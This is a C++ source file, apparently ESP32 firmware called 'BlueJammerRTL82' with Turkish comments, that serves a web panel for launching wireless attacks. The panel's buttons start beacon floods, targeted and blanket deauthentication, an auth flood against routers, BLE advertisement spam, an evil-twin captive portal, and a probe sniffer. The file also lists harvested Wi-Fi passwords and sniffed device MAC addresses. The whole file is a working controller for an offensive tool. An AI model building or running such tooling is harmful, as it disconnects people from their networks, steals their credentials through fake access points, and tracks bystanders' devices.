#include "WebPanel.h"
#include "debug.h"

// ============================================================
// HTML PANEL (PROGMEM)
// ============================================================
const char* WebPanel::PAGE_HTML = R"=====(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BlueJammerRTL82</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:16px;max-width:800px;margin:0 auto}
h1{color:#58a6ff;font-size:1.4rem;margin-bottom:6px;border-bottom:1px solid #30363d;padding-bottom:8px}
.status-bar{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0;font-size:0.85rem}
.status-bar span{padding:4px 10px;border-radius:4px;background:#21262d}
.on{color:#3fb950;font-weight:bold}
.off{color:#8b949e}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px}
.card h3{font-size:0.9rem;margin-bottom:6px;color:#c9d1d9}
.card .stat{font-size:0.8rem;color:#8b949e;margin-bottom:4px}
.btn{padding:6px 14px;border:none;border-radius:4px;cursor:pointer;font-size:0.8rem;font-weight:600}
.btn-start{background:#238636;color:#fff}
.btn-stop{background:#da3633;color:#fff}
.btn-start:hover{background:#2ea043}
.btn-stop:hover{background:#f85149}
.btn:disabled{opacity:0.5;cursor:not-allowed}
.section{margin:14px 0}
.section h2{font-size:1.1rem;color:#58a6ff;margin-bottom:6px;border-bottom:1px solid #21262d;padding-bottom:4px}
.cred{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:6px 8px;margin:4px 0;font-size:0.8rem}
.cred b{color:#f0883e}
.probe{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:4px 8px;margin:3px 0;font-size:0.75rem;color:#8b949e}
.empty{color:#484f58;font-style:italic;font-size:0.85rem;padding:8px 0}
#refresh{text-align:right;font-size:0.75rem;color:#484f58;margin-top:6px}
@media(max-width:480px){.grid{grid-template-columns:1fr}}
</style>
</head>
<body>
<h1>BlueJammerRTL82</h1>
<div class="status-bar" id="statusBar">Yukleniyor...</div>
<div class="grid" id="attackGrid"></div>
<div class="section">
<h2>Yakalanan Sifreler</h2>
<div id="capturedList"><div class="empty">Henuz sifre yok.</div></div>
</div>
<div class="section">
<h2>Probe Istekleri</h2>
<div id="probeList"><div class="empty">Henuz probe yok.</div></div>
</div>
<div id="refresh">Otomatik yenileniyor...</div>
<script>
const ATK=[
{id:'beaconflood',label:'Beacon Flood',desc:'Sanal AP yayini'},
{id:'singledeaut',label:'Single Deauth',desc:'Hedefi kopa'},
{id:'deauthall',label:'Deauth All',desc:'Tumunu kopa'},
{id:'authflood',label:'DDoS Router',desc:'Auth yagmuru'},
{id:'blespam',label:'BLE Spam',desc:'Reklam patlat'},
{id:'eviltwin',label:'Evil Twin',desc:'Sifre topla'},
{id:'probesniff',label:'Probe Sniff',desc:'Dinleme'}
];
function q(s){return document.querySelector(s)}
function qa(s){return document.querySelectorAll(s)}
function statusCls(on){return on?'on':'off'}
function buildGrid(st){
var h='';
ATK.forEach(function(a){
var key=a.id;
var on=st.wifiAttacks&&st.wifiAttacks[key]||(key=='blespam'&&st.bleSpam)||(key=='eviltwin'&&st.captivePortal)||(key=='probesniff'&&st.probeSniffer);
var cls=on?'btn-stop':'btn-start';
var lbl=on?'Durdur':'Baslat';
h+='<div class="card"><h3>'+a.label+'</h3><div class="stat">'+a.desc+'</div><div>Durum: <b class="'+statusCls(on)+'">'+(on?'AKTIF':'PASIF')+'</b></div><br><button class="btn '+cls+'" onclick="toggle(\''+a.id+'\','+(on?'true':'false')+')">'+lbl+'</button></div>';
});
q('#attackGrid').innerHTML=h;
}
function toggle(id,isOn){
var url=isOn?'/api/stop?type='+id:'/api/start?type='+id;
fetch(url).then(function(r){return r.text()}).then(function(t){console.log(t);refresh()});
}
function refresh(){
 fetch('/api/status').then(function(r){return r.json()}).then(function(j){
  buildGrid(j);
  q('#statusBar').innerHTML='<span>IP: '+j.ip+'</span>';
 }).catch(function(){q('#statusBar').innerHTML='<span class="off">Baglanti hatasi</span>'});
 fetch('/api/captured').then(function(r){return r.json()}).then(function(j){
  if(!j||j.length===0){q('#capturedList').innerHTML='<div class="empty">Henuz sifre yok.</div>';return}
  var h='';
  j.forEach(function(c){h+='<div class="cred"><b>'+c.ssid+'</b>: '+c.password+'</div>'});
  q('#capturedList').innerHTML=h;
 });
 fetch('/api/probes').then(function(r){return r.json()}).then(function(j){
  if(!j||j.length===0){q('#probeList').innerHTML='<div class="empty">Henuz probe yok.</div>';return}
  var h='';
  j.forEach(function(p){h+='<div class="probe"><b>'+p.ssid+'</b> ('+p.mac+')</div>'});
  q('#probeList').innerHTML=h;
 });
}
refresh();
setInterval(refresh,3000);
</script>
</body>
</html>
)=====";

// ============================================================
// CONSTRUCTOR
// ============================================================
WebPanel::WebPanel()
    : _wifi(nullptr)
    , _attacks(nullptr)
    , _ble(nullptr)
    , _portal(nullptr)
    , _probe(nullptr)
    , _server(nullptr)
    , _running(false)
    , _lastClientCheck(0)
{
    _ipAddrStr[0] = '\0';
}

// ============================================================
// BEGIN
// ============================================================
void WebPanel::begin(WiFiManager* wifiMgr, WiFiAttacks* attacks, BLESpam* ble, CaptivePortal* portal, ProbeSniffer* probe) {
    _wifi   = wifiMgr;
    _attacks = attacks;
    _ble    = ble;
    _portal = portal;
    _probe  = probe;
    DBG_PRINTF("[WebPanel] Modul kaydedildi.\n");
}

// ============================================================
// START
// ============================================================
bool WebPanel::start() {
    if (_running) {
        DBG_PRINTF("[WebPanel] Zaten aktif.\n");
        return true;
    }
    if (_wifi == nullptr) {
        DBG_PRINTF("[WebPanel] Hata: WiFiManager atanmadi.\n");
        return false;
    }

    // AP modunu baslat (Evil Twin ile karismamasi icin ayri SSID)
    bool apOk = _wifi->startAP(WEB_PANEL_SSID, WEB_PANEL_PSK, WEB_PANEL_CHANNEL);
    if (!apOk) {
        DBG_PRINTF("[WebPanel] AP baslatilamadi!\n");
        return false;
    }

    // Web sunucusunu baslat
    // WiFiServer'in sanal yikicisi yok - new/delete yerine once varsa durdur, yoksa olustur
    if (_server != nullptr) {
        _server->stop();
    } else {
        _server = new WiFiServer(WEB_PANEL_PORT);
    }
    _server->begin();
    _running = true;
    _lastClientCheck = millis();

    // IP string'ini JSON status icin cachele
    IPAddress panelIP = _wifi->getAPIP();
    snprintf(_ipAddrStr, sizeof(_ipAddrStr), "%d.%d.%d.%d",
        panelIP[0], panelIP[1], panelIP[2], panelIP[3]);

    DBG_PRINTF("[WebPanel] Panel baslatildi: http://%s:%d\n", _ipAddrStr, WEB_PANEL_PORT);
    return true;
}

// ============================================================
// STOP
// ============================================================
void WebPanel::stop() {
    if (!_running) return;
    _running = false;
    if (_server != nullptr) {
        _server->stop();
        // WiFiServer'in sanal yikicisi yok - delete UB'dir, nesneyi oldugu gibi birak.
        // start() cagrildiginda eski nesne durdurulur ve begin() ile yeniden baslatilir.
    }
    if (_wifi != nullptr) {
        _wifi->stopAP();
    }
    DBG_PRINTF("[WebPanel] Panel durduruldu.\n");
}

// ============================================================
// IS RUNNING
// ============================================================
bool WebPanel::isRunning() {
    return _running;
}

// ============================================================
// UPDATE - her loop'ta cagrilir
// ============================================================
void WebPanel::update() {
    if (!_running || _server == nullptr) return;

    unsigned long now = millis();

    // Her 50ms'de bir gelen istemciyi kontrol et
    if (now - _lastClientCheck < 50) return;
    _lastClientCheck = now;

    WiFiClient client = _server->available();
    if (client) {
        _handleClient(client);
    }
}

// ============================================================
// ISTEMCI ISLEME
// ============================================================
void WebPanel::_handleClient(WiFiClient client) {
    if (!client) return;

    // Zaman asimi ile oku
    unsigned long timeout = millis() + 2000;
    String req = "";
    while (client.connected() && millis() < timeout) {
        if (client.available()) {
            char c = client.read();
            req += c;
            if (req.endsWith("\r\n\r\n")) break;
        }
    }
    if (req.length() == 0) {
        client.stop();
        return;
    }

    // Ilk satiri al: "GET /path HTTP/1.1"
    String path = "/";
    int s1 = req.indexOf(' ');
    int s2 = req.indexOf(' ', s1 + 1);
    if (s1 > 0 && s2 > s1) {
        path = req.substring(s1 + 1, s2);
    }
    // Query string varsa ayir
    String query = "";
    int qIdx = path.indexOf('?');
    if (qIdx >= 0) {
        query = path.substring(qIdx + 1);
        path  = path.substring(0, qIdx);
    }

    // --- ROUTING ---
    if (path == "/api/status") {
        _sendJsonStatus(client);
    } else if (path == "/api/captured") {
        _sendJsonCaptured(client);
    } else if (path == "/api/probes") {
        _sendJsonProbes(client);
    } else if (path == "/api/start" || path == "/api/stop") {
        bool doStart = (path == "/api/start");
        // Query'den type parametresini al
        String type = "";
        int tIdx = query.indexOf("type=");
        if (tIdx >= 0) {
            type = query.substring(tIdx + 5);
            int ampIdx = type.indexOf('&');
            if (ampIdx >= 0) type = type.substring(0, ampIdx);
        }
        bool ok = false;
        if (type == "beaconflood") {
            if (doStart) ok = _attacks ? _attacks->startBeaconFlood() : false;
            else { if (_attacks) _attacks->stopBeaconFlood(); ok = true; }
        } else if (type == "singledeaut") {
            // Tekil deauth icin hedef gerekli - simdilik ilk taranani kullan
            if (doStart && _attacks) {
                NetworkInfo targets[1];
                if (_wifi && _wifi->getScanResults(targets, 1) > 0)
                    ok = _attacks->startSingleDeauth(targets[0].bssid, targets[0].channel);
                else ok = false;
            } else { if (_attacks) _attacks->stopSingleDeauth(); ok = true; }
        } else if (type == "deauthall") {
            if (doStart) ok = _attacks ? _attacks->startDeauthAll() : false;
            else { if (_attacks) _attacks->stopDeauthAll(); ok = true; }
        } else if (type == "authflood") {
            if (doStart && _attacks) {
                NetworkInfo targets[1];
                if (_wifi && _wifi->getScanResults(targets, 1) > 0)
                    ok = _attacks->startAuthFlood(targets[0].bssid, targets[0].channel);
                else ok = false;
            } else { if (_attacks) _attacks->stopAuthFlood(); ok = true; }
        } else if (type == "blespam") {
            if (doStart && _ble) { _ble->setSpamType(3); ok = _ble->start(); }
            else { if (_ble) _ble->stop(); ok = true; }
        } else if (type == "eviltwin") {
            if (doStart && _portal) {
                NetworkInfo targets[1];
                if (_wifi && _wifi->getScanResults(targets, 1) > 0)
                    ok = _portal->start(targets[0].ssid, targets[0].bssid, targets[0].channel);
                else ok = false;
            } else { if (_portal) _portal->stop(); ok = true; }
        } else if (type == "probesniff") {
            if (doStart) ok = _probe ? _probe->start() : false;
            else { if (_probe) _probe->stop(); ok = true; }
        }
        _sendJson(client, ok ? "{\"ok\":true}" : "{\"ok\":false}");
    } else {
        // Ana sayfa
        _sendHtml(client);
    }

    client.stop();
}

// ============================================================
// HTML GONDER
// ============================================================
void WebPanel::_sendHtml(WiFiClient& c) {
    _sendHeader(c, "text/html");
    c.print(PAGE_HTML);
}

// ============================================================
// STATUS JSON API
// ============================================================
void WebPanel::_sendJsonStatus(WiFiClient& c) {
    bool bf  = _attacks ? _attacks->isBeaconFloodRunning() : false;
    bool sd  = _attacks ? _attacks->isSingleDeauthRunning() : false;
    bool da  = _attacks ? _attacks->isDeauthAllRunning() : false;
    bool af  = _attacks ? _attacks->isAuthFloodRunning() : false;
    bool ble = _ble     ? _ble->isRunning() : false;
    bool cp  = _portal  ? _portal->isRunning() : false;
    bool ps  = _probe   ? _probe->isRunning() : false;

    char buf[300];
    snprintf(buf, sizeof(buf),
        "{\"wifiAttacks\":{"
        "\"beaconflood\":%s,\"singledeaut\":%s,\"deauthall\":%s,\"authflood\":%s},"
        "\"bleSpam\":%s,\"captivePortal\":%s,\"probeSniffer\":%s,"
        "\"packetsSent\":0,\"ip\":\"%s\"}",
        bf?"true":"false", sd?"true":"false", da?"true":"false", af?"true":"false",
        ble?"true":"false", cp?"true":"false", ps?"true":"false",
        _ipAddrStr
    );
    _sendJson(c, buf);
}

// ============================================================
// YAKALANAN SIFRELER API
// ============================================================
void WebPanel::_sendJsonCaptured(WiFiClient& c) {
    if (_portal == nullptr || _portal->getCapturedCount() == 0) {
        _sendJson(c, "[]");
        return;
    }
    String json = "[";
    int cnt = _portal->getCapturedCount();
    bool first = true;
    for (int i = 0; i < cnt; i++) {
        const CapturedCredential* cred = _portal->getCaptured(i);
        if (cred) {
            if (!first) json += ",";
            first = false;
            json += "{\"ssid\":\"";
            json += cred->ssid;
            json += "\",\"password\":\"";
            json += cred->password;
            json += "\"}";
        }
    }
    json += "]";
    _sendJson(c, json.c_str());
}

// ============================================================
// PROBE LIST API
// ============================================================
void WebPanel::_sendJsonProbes(WiFiClient& c) {
    if (_probe == nullptr || _probe->getProbeCount() == 0) {
        _sendJson(c, "[]");
        return;
    }
    String json = "[";
    int cnt = _probe->getProbeCount();
    bool first = true;
    for (int i = 0; i < cnt; i++) {
        const ProbeRecord* rec = _probe->getProbe(i);
        if (rec) {
            if (!first) json += ",";
            first = false;
            json += "{\"ssid\":\"";
            json += rec->ssid;
            json += "\",\"mac\":\"";
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                rec->mac[0], rec->mac[1], rec->mac[2],
                rec->mac[3], rec->mac[4], rec->mac[5]);
            json += macStr;
            json += "\"}";
        }
    }
    json += "]";
    _sendJson(c, json.c_str());
}

// ============================================================
// YARDIMCILAR
// ============================================================
void WebPanel::_sendHeader(WiFiClient& c, const char* contentType) {
    c.print("HTTP/1.1 200 OK\r\n");
    c.print("Content-Type: ");
    c.print(contentType);
    c.print("\r\n");
    c.print("Access-Control-Allow-Origin: *\r\n");
    c.print("Connection: close\r\n");
    c.print("\r\n");
}

void WebPanel::_sendJson(WiFiClient& c, const char* json) {
    _sendHeader(c, "application/json");
    c.print(json);
}
